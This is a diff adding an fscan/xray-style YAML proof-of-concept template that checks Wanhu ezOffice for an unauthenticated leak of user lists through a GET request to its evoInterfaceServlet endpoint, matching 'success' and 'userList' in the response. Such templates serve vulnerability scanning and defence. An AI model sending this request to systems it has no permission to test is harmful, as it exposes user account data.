@@ -1,0 +1,12 @@
+name: wanhu-ez-office-unleak
+# 与xray 相同的是,fscan 的 body 也是 | 换行 ，expression 也是 >- 换行
+groups:
+  poc:
+    - method: GET
+      path: /defaultroot/evoInterfaceServlet?paramType=user
+      follow_redirects: false
+      expression: >-
+        response.body.bcontains(b"success") && response.body.bcontains(b"userList")
+detail: 
+  links: 
+  authors:
